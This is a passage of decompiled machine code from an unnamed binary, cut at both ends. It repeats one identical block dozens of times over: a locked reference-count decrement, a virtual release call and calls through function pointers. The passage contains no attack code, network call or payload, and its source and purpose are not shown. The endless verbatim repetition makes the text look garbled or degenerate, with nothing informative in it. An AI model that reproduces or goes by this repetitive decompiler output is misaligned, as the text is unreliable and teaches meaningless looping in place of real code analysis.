< 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, 